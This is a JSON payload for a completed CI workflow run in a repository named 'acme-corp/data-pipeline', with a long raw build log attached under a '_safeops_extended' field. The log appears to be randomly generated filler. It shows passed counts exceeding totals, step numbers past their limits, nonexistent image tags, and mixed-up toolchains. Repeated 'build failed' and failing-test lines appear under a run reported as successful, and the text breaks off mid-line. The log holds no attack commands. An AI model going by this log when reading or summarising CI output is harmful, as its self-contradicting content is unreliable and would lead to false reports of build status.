{
  "action": "completed",
  "workflow_run": {
    "id": 411,
    "name": "CI Pipeline",
    "head_branch": "main",
    "head_sha": "bee6ab2444fb476b22c66addfec7a0acbf71e0a7",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-26T12:46:43.771797Z",
    "updated_at": "2025-11-26T12:49:12.734490Z"
  },
  "repository": {
    "full_name": "acme-corp/data-pipeline",
    "name": "data-pipeline"
  },
  "sender": {
    "login": "bob"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: type_check ===\n[12:46:43] INFO: Cache refreshed\nChecking out master branch\nCache miss for key-6969\n  PASS: test_user_create (152ms)\n[12:46:43] WARN: Deprecated API usage\nCoverage: 89% statements, 67% branches\nProcessing...\nLayer 2/11: RUN command\nRan 91 tests in 1s\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] INFO: Processing request\nVerifying...\n[12:46:43] INFO: Processing request\nHEAD is now at 0778162\nEnvironment: development\nCreating production build...\nDone.\nnpm install: resolved 1414 packages\nStep 18/19: Deploying\nCache invalidated: build\nStep 5/20: Building\nFetching from https://pypi.org/package.json\nCompiling components/main.py...\nPOST /data - 201 (40ms)\nCompiling utils/app.ts...\n[12:46:43] WARN: Deprecated API usage\nChecking out develop branch\nGET /api - 204 (36ms)\nHEAD is now at 1b3d796\n[12:46:43] INFO: Starting build process\nPushing to registry...\nFetching from https://githubusercontent.com/package.json\nTLS handshake completed\nMinifying main.js\nOptimizing 23 modules...\n[12:46:43] INFO: Starting build process\nImage pulled successfully\nPushing to registry...\n\u2713 Task completed in 2801ms\n[12:46:43] INFO: Request completed\nCompiling lib/app.ts...\n[12:46:43] INFO: Connecting to database\nUploading artifact 'build' (34 files)\nCompiling src/index.js...\nBuilding Docker image...\nCompiling lib/index.js...\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] WARN: Deprecated API usage\nCache saved successfully\nCompiling utils/service.java...\nSnapshots: 29 passed, 10 total\nEnvironment: development\nnpm notice: created a lockfile\nGET /status - 201 (84ms)\nHEAD is now at 4211850\nWARNING: react has known vulnerabilities\nCache invalidated: dependencies\nWaiting...\nBuilding Docker image...\n[12:46:43] WARN: Deprecated API usage\nStep 19/17: Deploying\nFetching submodules...\nPOST /api - 201 (460ms)\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] DEBUG: Query executed in 2ms\nHEAD is now at 60bda71\nEnvironment: production\nFinished.\nChecking out main branch\nCoverage: 88% statements, 95% branches\npip: Downloading jest-2.20.tar.gz\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nOptimizing 87 modules...\nFetching from https://googleapis.com/package.json\nCache hit for key-3106\nReady.\nProcessing...\nLoading...\nStep 5/16: Running migrations\nPulling image: alpine:latest\nStep 17/24: Building\nNODE_ENV=test\nPlatform: darwin-arm64\npip install: Successfully installed axios-3.14\npip: Installing build dependencies...\nDone.\nPulling image: alpine:3.11\nCache saved successfully\nCache miss for key-3454\nWARNING: jest has known vulnerabilities\nTests: 306 passed, 305 total\nMinifying vendor.js\nCache miss for key-9841\n[12:46:43] INFO: Connecting to database\nStep 8/16: Testing\nAlready up to date.\n[12:46:43] DEBUG: Query executed in 86ms\nPulling image: node:3.11\nnpm notice: created a lockfile\nFetching from https://npmjs.org/package.json\n\u2713 Task completed in 2172ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/utils.go...\nPlatform: linux-x64\nHEAD is now at 2cff03c\nnpm install: added 87 packages\npip: Downloading express-4.10.tar.gz\nStep 13/20: Testing\nCache invalidated: build\nArtifact uploaded: build.tar.gz (25MB)\nCache miss for key-8996\n\u2713 package completed\nCreating production build...\nWaiting...\n[12:46:43] INFO: Request completed\nStep 8/19: Linting\n[12:46:43] WARN: Deprecated API usage\nTransforming 136 files...\nStep 17/20: Running migrations\nFAILED: test_cache_hit\nHEAD is now at ab6c267\nCache invalidated: node_modules\nStep 19/15: Testing\nPOST /upload - 202 (23ms)\nTests: 458 passed, 154 total\nLoading...\n\u2713 Step 'test' succeeded\nTime: 60.327s\nInstalling webpack@5.13.6\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Loading configuration\nNODE_ENV=test\n\u2713 Step 'checkout' succeeded\nWaiting...\n[12:46:43] INFO: Request completed\npip: Collecting jest\nWARNING: webpack has known vulnerabilities\nNODE_ENV=production\nPushing to registry...\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] WARN: Deprecated API usage\nBuilding Docker image...\npip: Collecting eslint\npip: Installing build dependencies...\npip install: Successfully installed webpack-1.13\n\u2713 All checks passed\nInstalling prettier@5.7.9\nCompiling components/app.ts...\n\u2713 Task completed in 588ms\nTransforming 187 files...\nStep 13/18: Deploying\nRan 101 tests in 46s\npip: Collecting lodash\nConnection established\nStep 18/24: Installing dependencies\nArtifact uploaded: build.tar.gz (4MB)\n[12:46:43] INFO: Request completed\nWaiting...\n[12:46:43] DEBUG: Initializing service\nCache miss for key-6922\nConnection established\nCreating production build...\nSnapshots: 42 passed, 37 total\nWaiting...\nUploading artifact 'build' (23 files)\nTest Suites: 42 passed, 26 total\n\u2713 All checks passed\nFetching submodules...\n[12:46:43] INFO: Connecting to database\nMinifying main.js\n[12:46:43] DEBUG: Query executed in 32ms\nStep 2/24: Running migrations\nWARNING: express has known vulnerabilities\n\u2713 package completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n\u2717 build failed with exit code 100\nWaiting...\nWaiting...\nGET /health - 200 (22ms)\n[12:46:43] INFO: Connecting to database\nSnapshots: 22 passed, 24 total\npip: Installing build dependencies...\nPlatform: win32-x64\nProcessing...\nSnapshots: 1 passed, 29 total\nCompiling components/main.py...\nHEAD is now at 27a1d6f\nWARNING: axios has known vulnerabilities\nUsing Node.js 14.14.4\nNODE_ENV=development\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Installing build dependencies...\nStep 2/20: Running migrations\nSwitched to branch 'hotfix/task-325'\nCompiling utils/app.ts...\npip install: Successfully installed axios-3.14\nCache saved successfully\nInstalling eslint@5.5.2\nCreating production build...\nCoverage: 72% statements, 100% branches\nGenerating source maps...\n[12:46:43] INFO: Request completed\nFetching from https://amazonaws.com/package.json\n  PASS: e2e/test_user_create.spec.js\nnpm notice: created a lockfile\nMinifying main.js\nEnvironment: staging\nnpm install: resolved 1848 packages\n\u2713 build completed\nCache saved successfully\nPlatform: linux-x64\nPushing to registry...\nWARNING: eslint has known vulnerabilities\nSnapshots: 37 passed, 0 total\n  PASS: test_db_connect (173ms)\nImage pulled successfully\nOK\nArtifact uploaded: build.tar.gz (4MB)\nCache saved successfully\nArtifact uploaded: dist.zip (58MB)\n  PASS: test_cache_hit (146ms)\nCompiling utils/index.js...\nCache miss for key-5177\nCompleted.\n[12:46:43] INFO: Processing request\n[12:46:43] INFO: Processing request\nPOST /api - 201 (499ms)\nHEAD is now at 74e311c\npip: Downloading eslint-2.11.tar.gz\n\u2713 validate completed\nStep 5/18: Linting\nBundling runtime.js\nnpm install: resolved 633 packages\nBundling main.js\npip: Collecting express\nStep 19/23: Installing dependencies\nCompiling src/index.js...\n[12:46:43] INFO: Processing request\nCache hit for key-2450\nNODE_ENV=development\n[12:46:43] DEBUG: Query executed in 91ms\nSuccess!\nCache saved successfully\n[12:46:43] INFO: Processing request\nnpm notice: created a lockfile\nLoading...\nStep 8/18: Linting\npip install: Successfully installed axios-4.7\nGET /health - 201 (9ms)\nnpm notice: package.json updated\nUploading artifact 'coverage' (7 files)\npip: Installing build dependencies...\n[12:46:43] INFO: Connecting to database\n=== Step type_check completed ===\n=== Step: restore_cache ===\nStep 13/19: Linting\nArtifact uploaded: build.tar.gz (26MB)\n\u2713 validate completed\nOptimizing 43 modules...\n\u2717 build failed with exit code 118\nLayer 5/8: ENV command\nLoading...\nUploading artifact 'dist' (17 files)\n[12:46:43] INFO: Processing request\nTransforming 498 files...\nnpm notice: created a lockfile\n[12:46:43] WARN: Deprecated API usage\nTests: 292 passed, 115 total\nCache miss for key-3475\nMinifying app.js\nTest Suites: 12 passed, 31 total\nTime: 105.625s\nSwitched to branch 'bugfix/task-463'\nSnapshots: 2 passed, 12 total\nGenerating source maps...\nCompiling utils/app.ts...\nSwitched to branch 'feature/task-555'\nNODE_ENV=development\nGenerating source maps...\nStep 5/18: Building\n\u2713 All checks passed\nHEAD is now at 1a57a34\nStep 11/23: Building\nUsing Python 3.11\nDone.\npip: Collecting express\nUsing Python 3.12\nChecking out master branch\nWaiting...\nPulling image: python:3.11\nGenerating source maps...\nStep 12/17: Testing\nFetching submodules...\nBuilding Docker image...\nFAILED: test_auth_login\nArtifact uploaded: build.tar.gz (43MB)\npip: Installing build dependencies...\nException: RuntimeError\nStep 1/25: Installing dependencies\nStep 7/20: Building\npip: Downloading eslint-4.6.tar.gz\nPulling image: alpine:18\npip: Installing build dependencies...\nCache invalidated: dependencies\nWaiting...\nUsing Node.js 18.20.10\nCache invalidated: dependencies\nyarn add: Done in 15.67s\n[12:46:43] INFO: Cache refreshed\nInstalling axios@1.0.7\nBundling vendor.js\nDone.\nDone.\nSnapshots: 31 passed, 40 total\nnpm notice: package.json updated\nCompiling components/index.js...\nPushing to registry...\nCoverage: 79% statements, 90% branches\nSwitched to branch 'bugfix/task-854'\nSnapshots: 19 passed, 33 total\nTests: 386 passed, 443 total\n[12:46:43] INFO: Cache refreshed\nWARNING: jest has known vulnerabilities\nArtifact uploaded: dist.zip (64MB)\n[12:46:43] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (20MB)\nLoading...\nVerifying...\npip: Collecting prettier\nStep 3/22: Linting\nStep 10/15: Building\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 Step 'build' succeeded\nStep 1/20: Testing\nCompiling lib/app.ts...\nPulling image: alpine:3.11\nCache miss for key-7399\n[12:46:43] INFO: Connecting to database\nDone.\n[12:46:43] ERROR: Connection failed\nArtifact downloaded: 17MB\nOptimizing 54 modules...\nPOST /data - 200 (94ms)\nyarn add: Done in 4.32s\nCompiling src/service.java...\nStep 3/24: Building\nCompiling src/app.ts...\nCompiling components/main.py...\nSuccess!\n[12:46:43] DEBUG: Query executed in 59ms\nCompiling components/app.ts...\nInstalling prettier@2.8.9\nFetching submodules...\npip install: Successfully installed express-1.13\nStep 7/20: Testing\nCompiling src/service.java...\nTransforming 638 files...\nCoverage: 72% statements, 70% branches\nPulling image: python:18\nTransforming 797 files...\nCache restored successfully (118MB)\nArtifact uploaded: build.tar.gz (18MB)\nUploading artifact 'dist' (26 files)\n[12:46:43] DEBUG: Loading configuration\nUsing Node.js 15.6.5\nStep 18/25: Installing dependencies\nEnvironment: staging\nArtifact uploaded: build.tar.gz (22MB)\n[12:46:43] INFO: Processing request\nLayer 1/12: ENV command\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] DEBUG: Query executed in 28ms\n[12:46:43] INFO: Request completed\nOK\nUsing Node.js 20.2.9\nCompiling components/handler.rs...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_db_connect (273ms)\npip: Collecting axios\n[12:46:43] ERROR: Connection failed\n[12:46:43] WARN: Deprecated API usage\nBuilding Docker image...\nStep 8/22: Linting\nCompiling components/app.ts...\nnpm install: added 356 packages\nTest Suites: 12 passed, 39 total\n[12:46:43] WARN: Deprecated API usage\nArtifact uploaded: dist.zip (16MB)\nUsing Node.js 19.15.9\nOptimizing 61 modules...\nSwitched to branch 'hotfix/task-643'\n[12:46:43] DEBUG: Query executed in 78ms\nStep 9/24: Running migrations\nMinifying vendor.js\nProcessing...\npip: Downloading lodash-3.5.tar.gz\n[12:46:43] DEBUG: Loading configuration\nLoading...\nEnvironment: staging\nFAILED: test_auth_login\nFetching from https://amazonaws.com/package.json\nCreating production build...\nPushing to registry...\n[12:46:43] INFO: Processing request\npip install: Successfully installed jest-4.12\nRan 156 tests in 51s\n\u2713 Step 'setup' succeeded\nHEAD is now at 7d4f081\nOptimizing 89 modules...\nConnection established\n[12:46:43] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\nTests: 453 passed, 274 total\nRan 90 tests in 44s\nStep 19/15: Testing\nCompiling utils/main.py...\nCache invalidated: build\n[12:46:43] DEBUG: Initializing service\nCreating production build...\nChecking out develop branch\nCompiling components/app.ts...\npip: Downloading axios-3.10.tar.gz\nStep 17/21: Building\npip install: Successfully installed webpack-1.17\nGenerating source maps...\n[12:46:43] INFO: Connecting to database\nFetching from https://gcr.io/package.json\nFetching from https://githubusercontent.com/package.json\nOK\nnpm install: resolved 1198 packages\nFinished.\n\u2717 build failed with exit code 50\n  PASS: e2e/test_user_create.spec.js\nDone.\nPOST /api - 200 (387ms)\nFetching from https://docker.io/package.json\nLoading...\n\u2713 deploy completed\nTLS handshake completed\nCache invalidated: node_modules\n[12:46:43] INFO: Starting build process\nCache hit for key-5942\nFetching from https://docker.io/package.json\npip: Downloading prettier-5.16.tar.gz\n[12:46:43] DEBUG: Query executed in 58ms\nArtifact downloaded: 5MB\nStep 2/16: Building\nLoading...\nCache hit for key-1085\nCache saved successfully\nCache saved successfully\nChecking out develop branch\nTransforming 286 files...\nCache hit for key-4162\nGenerating source maps...\nArtifact uploaded: build.tar.gz (13MB)\nException: RuntimeError\nnpm install: resolved 1040 packages\nFetching submodules...\n\u2713 build completed\nHEAD is now at 02a52aa\nUsing Node.js 14.18.7\nBundling main.js\nCache miss for key-3118\nReady.\n\u2713 package completed\n[12:46:43] DEBUG: Initializing service\nPushing to registry...\nnpm notice: package.json updated\nAlready up to date.\nProcessing...\nCoverage: 70% statements, 80% branches\npip: Collecting prettier\nPOST /api - 200 (423ms)\npip: Installing build dependencies...\nImage pulled successfully\nCompiling src/main.py...\nPOST /upload - 202 (242ms)\nStep 11/23: Installing dependencies\nGenerating source maps...\nHEAD is now at e7255a6\nTest Suites: 16 passed, 15 total\nStep 10/24: Linting\nStep 15/15: Installing dependencies\n[12:46:43] INFO: Connecting to database\nArtifact uploaded: dist.zip (63MB)\npip install: Successfully installed react-2.18\nCache invalidated: dependencies\nException: NullPointerException\n[12:46:43] WARN: Deprecated API usage\nReady.\nWARNING: react has known vulnerabilities\n[12:46:43] ERROR: Connection failed\nCache restored successfully (115MB)\nTime: 102.709s\nNODE_ENV=production\nStep 2/23: Installing dependencies\nImage pulled successfully\nCreating production build...\nOptimizing 63 modules...\npip: Collecting react\nFinished.\nCache saved successfully\nAlready up to date.\nCache saved successfully\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 8/21: Building\n[12:46:43] DEBUG: Connection pool: 6 active\nUploading artifact 'dist' (25 files)\n=== Step restore_cache completed ===\n=== Step: build ===\n[12:46:43] INFO: Connecting to database\nCompiling utils/handler.rs...\nException: ValueError\nRan 37 tests in 54s\nArtifact uploaded: dist.zip (65MB)\n\u2717 build failed with exit code 121\nTests: 223 passed, 431 total\nBundling runtime.css\npip install: Successfully installed express-1.2\nConnection established\nSwitched to branch 'hotfix/task-560'\n[12:46:43] INFO: Request completed\nArtifact uploaded: dist.zip (78MB)\nCompleted.\n[12:46:43] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nPlatform: linux-x64\nUploading artifact 'build' (38 files)\n\u2713 Task completed in 1260ms\n\u2713 All checks passed\nWARNING: lodash has known vulnerabilities\nBuilding Docker image...\n[12:46:43] WARN: Deprecated API usage\nCache miss for key-5855\n\u2713 Step 'install' succeeded\nDone.\nArtifact uploaded: dist.zip (78MB)\nPushing to registry...\nGET /status - 201 (15ms)\nUsing Node.js 20.10.10\n\u2717 build failed with exit code 122\nBundling vendor.js\nPlatform: linux-x64\n[12:46:43] DEBUG: Memory usage: 748MB\nCompiling src/utils.go...\n[12:46:43] ERROR: Connection failed\nTLS handshake completed\nBundling vendor.js\nPulling image: node:3.11\npip: Downloading axios-1.6.tar.gz\nEnvironment: test\n  PASS: unit/test_cache_hit.spec.js\nChecking out develop branch\nCoverage: 76% statements, 67% branches\nFinished.\nAlready up to date.\nFetching submodules...\nHEAD is now at cb4f58c\nBundling runtime.css\nInstalling prettier@4.5.4\nImage pulled successfully\nPOST /data - 201 (166ms)\nWARNING: webpack has known vulnerabilities\nInstalling eslint@2.2.7\nnpm notice: package.json updated\npip: Downloading eslint-5.1.tar.gz\nnpm notice: created a lockfile\nCache miss for key-8010\nDone.\n[12:46:43] INFO: Cache refreshed\npip: Collecting webpack\nnpm install: resolved 795 packages\nEnvironment: test\nnpm notice: package.json updated\nCompiling utils/handler.rs...\nTest Suites: 24 passed, 47 total\nBuilding Docker image...\n[12:46:43] INFO: Cache refreshed\n[12:46:43] WARN: Deprecated API usage\nBundling vendor.js\nTLS handshake completed\nCompiling components/utils.go...\n[12:46:43] DEBUG: Loading configuration\npip: Collecting webpack\nCache miss for key-5835\nAlready up to date.\n[12:46:43] DEBUG: Loading configuration\nStep 1/15: Installing dependencies\nSnapshots: 17 passed, 38 total\n\u2713 Step 'install' succeeded\nPushing to registry...\n[12:46:43] DEBUG: Initializing service\n\u2713 All checks passed\nTLS handshake completed\nArtifact uploaded: build.tar.gz (27MB)\nWaiting...\nPulling image: alpine:3.11\nDone.\nCompiling lib/app.ts...\nOK\nSwitched to branch 'hotfix/task-390'\nSwitched to branch 'hotfix/task-236'\nWARNING: axios has known vulnerabilities\nOK\nChecking out develop branch\nFetching submodules...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nGenerating source maps...\nWARNING: eslint has known vulnerabilities\nCache miss for key-8639\nBuilding Docker image...\nImage pulled successfully\nCache invalidated: build\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-185'\n[12:46:43] WARN: Deprecated API usage\nInstalling axios@4.11.4\nStep 19/25: Running migrations\n\u2713 All checks passed\npip: Downloading react-3.11.tar.gz\nHEAD is now at 3c38862\nRan 72 tests in 18s\nPulling image: alpine:18\nFinished.\nBuilding Docker image...\nTime: 16.445s\nStep 17/19: Testing\nGenerating source maps...\nTests: 105 passed, 60 total\nStep 1/18: Testing\nPlatform: darwin-arm64\n[12:46:43] INFO: Cache refreshed\nSuccess!\nPOST /api - 200 (229ms)\nTests: 455 passed, 193 total\nConnection established\nTest Suites: 45 passed, 25 total\n[12:46:43] DEBUG: Memory usage: 767MB\nCache hit for key-1129\nnpm notice: package.json updated\nBundling vendor.css\n[12:46:43] DEBUG: Loading configuration\nCache restored successfully (363MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:46:43] WARN: Deprecated API usage\nTest Suites: 10 passed, 44 total\nWARNING: lodash has known vulnerabilities\n[12:46:43] WARN: Deprecated API usage\nWaiting...\nUsing Node.js 19.8.2\n\u2713 All checks passed\nImage pulled successfully\nStep 1/16: Linting\nStep 9/21: Building\nArtifact uploaded: dist.zip (33MB)\n[12:46:43] ERROR: Connection failed\nCache miss for key-9745\nPushing to registry...\nnpm install: resolved 1106 packages\n\u2713 build completed\nTransforming 215 files...\nMinifying main.js\nProcessing...\n  PASS: e2e/test_cache_hit.spec.js\nCache hit for key-5826\nPOST /upload - 202 (429ms)\nFAILED: test_cache_hit\nTransforming 594 files...\n\u2713 validate completed\nPlatform: win32-x64\nStep 13/18: Running migrations\nEnvironment: production\nWARNING: react has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCoverage: 89% statements, 97% branches\nGET /health - 204 (80ms)\nOptimizing 62 modules...\nImage pulled successfully\nOK\n[12:46:43] INFO: Cache refreshed\nPushing to registry...\nPlatform: win32-x64\nGET /status - 200 (79ms)\nChecking out develop branch\nImage pulled successfully\nTime: 96.106s\nCompleted.\nStep 19/23: Running migrations\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:43] DEBUG: Connection pool: 11 active\nWARNING: axios has known vulnerabilities\nFinished.\nWaiting...\nGenerating source maps...\nStep 6/20: Testing\nFetching submodules...\nCache hit for key-9282\nRan 131 tests in 36s\n  PASS: unit/test_auth_login.spec.js\nSnapshots: 31 passed, 0 total\nStep 20/20: Running migrations\nException: NullPointerException\n[12:46:43] DEBUG: Memory usage: 1914MB\nHEAD is now at a6bd191\nBundling styles.css\nyarn add: Done in 11.45s\nWaiting...\nLoading...\n[12:46:43] DEBUG: Loading configuration\npip install: Successfully installed express-3.11\n[12:46:43] DEBUG: Initializing service\nCache saved successfully\n\u2713 Task completed in 2326ms\nReady.\nnpm install: resolved 474 packages\nMinifying app.js\nEnvironment: production\npip install: Successfully installed lodash-1.11\nEnvironment: staging\nProcessing...\n[12:46:43] WARN: Deprecated API usage\n\u2717 build failed with exit code 104\n[12:46:43] WARN: Deprecated API usage\n\u2713 Task completed in 4734ms\nGET /health - 201 (30ms)\nPOST /api - 202 (263ms)\n[12:46:43] DEBUG: Memory usage: 185MB\nInstalling axios@2.3.9\n\u2713 All checks passed\nArtifact uploaded: dist.zip (37MB)\nStep 2/15: Building\nPOST /data - 202 (496ms)\n[12:46:43] INFO: Starting build process\nCompiling components/index.js...\n[12:46:43] WARN: Deprecated API usage\nCache saved successfully\nOptimizing 85 modules...\nDone.\nnpm install: added 53 packages\nUsing Python 3.11\n[12:46:43] INFO: Processing request\nPOST /upload - 200 (195ms)\nPlatform: win32-x64\nTest Suites: 43 passed, 16 total\nUploading artifact 'coverage' (19 files)\n[12:46:43] DEBUG: Initializing service\nPulling image: python:18\nWARNING: lodash has known vulnerabilities\npip: Collecting react\nStep 9/23: Running migrations\nTest Suites: 9 passed, 50 total\n\u2713 Step 'checkout' succeeded\nFetching from https://pypi.org/package.json\n[12:46:43] WARN: Deprecated API usage\npip install: Successfully installed express-5.20\nHEAD is now at d51f226\nCompiling components/main.py...\n  PASS: e2e/test_cache_hit.spec.js\nTests: 104 passed, 245 total\npip: Installing build dependencies...\nChecking out master branch\nFinished.\nArtifact uploaded: build.tar.gz (36MB)\n=== Step build completed ===\n=== Step: e2e_tests ===\nDone.\n\u2713 lint completed\nWARNING: express has known vulnerabilities\nnpm install: resolved 328 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nFinished.\nBundling vendor.css\nStep 6/18: Linting\n[12:46:43] ERROR: Connection failed\n  PASS: test_api_health (149ms)\nGenerating source maps...\n[12:46:43] INFO: Starting build process\nTLS handshake completed\nInstalling lodash@2.20.0\n[12:46:43] WARN: Deprecated API usage\nNODE_ENV=development\nStep 5/17: Installing dependencies\nEnvironment: test\n  PASS: test_cache_hit (130ms)\nPlatform: darwin-arm64\n[12:46:43] WARN: Deprecated API usage\n[12:46:43] DEBUG: Query executed in 7ms\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (41MB)\n[12:46:43] INFO: Connecting to database\n[12:46:43] DEBUG: Memory usage: 1212MB\nBuilding Docker image...\nProcessing...\nImage pulled successfully\nStep 8/20: Deploying\nBuilding Docker image...\nCache saved successfully\nSuccess!\nBundling styles.css\nCompleted.\nTLS handshake completed\nStep 1/15: Installing dependencies\nOK\n[12:46:43] DEBUG: Loading configuration\n[12:46:43] INFO: Request completed\nUploading artifact 'dist' (6 files)\nNODE_ENV=development\n  PASS: test_auth_login (492ms)\nCache saved successfully\nArtifact uploaded: dist.zip (93MB)\nCoverage: 71% statements, 82% branches\nStep 11/21: Deploying\nRan 142 tests in 13s\nGenerating source maps...\n[12:46:43] INFO: Cache refreshed\n[12:46:43] DEBUG: Loading configuration\nSuccess!\nFAILED: test_user_create\nnpm install: added 102 packages\nUploading artifact 'dist' (16 files)\n[12:46:43] DEBUG: Loading configuration\nOptimizing 75 modules...\nBundling runtime.css\nCompleted.\nCompleted.\nOptimizing 81 modules...\nArtifact uploaded: dist.zip (4MB)\nAlready up to date.\nStep 10/17: Linting\n[12:46:43] WARN: Deprecated API usage\nStep 19/16: Deploying\nCompiling components/handler.rs...\nTransforming 938 files...\n[12:46:43] INFO: Request completed\nBuilding Docker image...\nImage pulled successfully\nGET /health - 200 (30ms)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 13/20: Building\nnpm install: added 99 packages\nTLS handshake completed\nReady.\nFetching from https://pypi.org/package.json\nCache miss for key-3632\nException: TypeError\nUsing Python 3.12\nnpm install: resolved 1420 packages\n\u2713 lint completed\nWARNING: react has known vulnerabilities\nBundling vendor.js\n[12:46:43] WARN: Deprecated API usage\nConnection established\n[12:46:43] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-352'\nCoverage: 85% statements, 61% branches\nStep 6/25: Deploying\nStep 17/15: Building\nReady.\nImage pulled successfully\nCache hit for key-5559\nGenerating source maps...\n[12:46:43] DEBUG: Query executed in 45ms\nPlatform: win32-x64\nConnection established\nTLS handshake completed\nBuilding Docker image...\nCache restored successfully (206MB)\nnpm notice: created a lockfile\nTest Suites: 6 passed, 27 total\n[12:46:43] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:46:43] WARN: Deprecated API usage\nStep 5/20: Running migrations\nStep 5/15: Linting\nPlatform: linux-x64\nVerifying...\nnpm notice: package.json updated\nChecking out main branch\nFinished.\nProcessing...\nUsing Python 3.10\npip install: Successfully installed lodash-4.9\nnpm notice: created a lockfile\nUsing Node.js 14.20.0\npip: Collecting axios\nMinifying main.js\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nyarn add: Done in 29.95s\n[12:46:43] WARN: Deprecated API usage\n  PASS: test_api_health (136ms)\nCache hit for key-2555\n\u2713 All checks passed\n[12:46:43] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm install: resolved 1551 packages\nFinished.\nCache hit for key-5670\nFetching submodules...\nCompleted.\n  PASS: test_db_connect (24ms)\nArtifact downloaded: 2MB\npip: Collecting jest\nVerifying...\nLoading...\nSwitched to branch 'hotfix/task-495'\nTest Suites: 44 passed, 30 total\nSwitched to branch 'feature/task-828'\n[12:46:43] DEBUG: Loading configuration\nStep 6/19: Building\nConnection established\nSwitched to branch 'feature/task-781'\n\u2717 build failed with exit code 5\npip: Installing build dependencies...\nNODE_ENV=development\npip: Installing build dependencies...\nGenerating source maps...\nStep 12/18: Testing\n[12:46:43] DEBUG: Loading configuration\n\u2713 All checks passed\nCache restored successfully (387MB)\nBuilding Docker image...\nTime: 85.647s\nTime: 70.144s\n[12:46:43] DEBUG: Initializing service\nUsing Python 3.10\n[12:46:43] DEBUG: Connection pool: 16 active\n[12:46:43] WARN: Deprecated API usage\n\u2713 Task completed in 2764ms\npip install: Successfully installed jest-3.16\nCreating production build...\nnpm notice: created a lockfile\nGET /health - 201 (66ms)\npip install: Successfully installed webpack-1.11\n[12:46:43] DEBUG: Loading configuration\nFetching from https://googleapis.com/package.json\nCompiling src/handler.rs...\nCompiling components/handler.rs...\n[12:46:43] DEBUG: Connection pool: 2 active\nRan 20 tests in 23s\n[12:46:43] DEBUG: Connection pool: 12 active\nCompiling src/app.ts...\n\u2713 Task completed in 3807ms\nOK\nLoading...\nTLS handshake completed\nCompiling lib/app.ts...\n[12:46:43] INFO: Connecting to database\nPulling image: alpine:18\nCompiling components/main.py...\n\u2717 build failed with exit code 24\nCompiling components/handler.rs...\nConnection established\nTLS handshake completed\nArtifact downloaded: 46MB\nCoverage: 93% statements, 95% branches\nHEAD is now at 5c0b39d\nHEAD is now at d8360c8\nTests: 196 passed, 489 total\nPulling image: alpine:3.11\n\u2717 build failed with exit code 25\nVerifying...\nFetching submodules...\nSwitched to branch 'hotfix/task-496'\nStep 9/22: Installing dependencies\n\u2713 validate completed\nTime: 37.136s\nStep 10/20: Deploying\nStep 19/22: Linting\nOK\nPlatform: darwin-arm64\nyarn add: Done in 26.9s\nStep 11/23: Deploying\nnpm notice: created a lockfile\nSuccess!\nPulling image: alpine:latest\n[12:46:43] INFO: Connecting to database\n[12:46:43] ERROR: Connection failed\nStep 13/19: Building\n\u2713 test completed\n\u2713 Step 'checkout' succeeded\npip install: Successfully installed jest-4.7\nCompiling lib/service.java...\n[12:46:43] INFO: Request completed\nVerifying...\nPlatform: win32-x64\nSuccess!\n\u2713 Step 'setup' succeeded\n[12:46:43] INFO: Request completed\nRan 20 tests in 32s\nBuilding Docker image...\n\u2713 test completed\nWARNING: prettier has known vulnerabilities\nBundling main.js\nPushing to registry...\nCache restored successfully (64MB)\n[12:46:43] INFO: Starting build process\nEnvironment: development\nnpm notice: created a lockfile\nBundling vendor.css\nHEAD is now at 02e6d03\nUploading artifact 'build' (41 files)\nPlatform: linux-x64\nSnapshots: 10 passed, 22 total\nnpm install: resolved 199 packages\nCache miss for key-1019\nFetching submodules...\nPlatform: win32-x64\nStep 7/23: Deploying\n[12:46:43] DEBUG: Query executed in 67ms\nStep 12/23: Running migrations\nnpm install: added 91 packages\n[12:46:43] INFO: Connecting to database\nCreating production build...\nPlatform: linux-x64\nGenerating source maps...\nnpm notice: package.json updated\nWARNING: express has known vulnerabilities\n  PASS: e2e/test_user_create.spec.js\npip: Collecting express\nStep 19/17: Building\n=== Step e2e_tests completed ===\n=== Step: setup_environment ===\n[12:46:43] DEBUG: Connection pool: 8 active\nPulling image: alpine:3.11\nCompiling src/handler.rs...\n[12:46:43] ERROR: Connection failed\nnpm notice: package.json updated\nnpm notice: package.json updated\nStep 14/16: Testing\n[12:46:43] INFO: Cache refreshed\nSuccess!\nWARNING: eslint has known vulnerabilities\n[12:46:43] INFO: Request completed\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nReady.\nCache miss for key-6814\nArtifact uploaded: build.tar.gz (17MB)\n[12:46:43] DEBUG: Connection pool: 18 active\nnpm notice: package.json updated\nStep 10/21: Running migrations\nException: RuntimeError\nPOST /api - 202 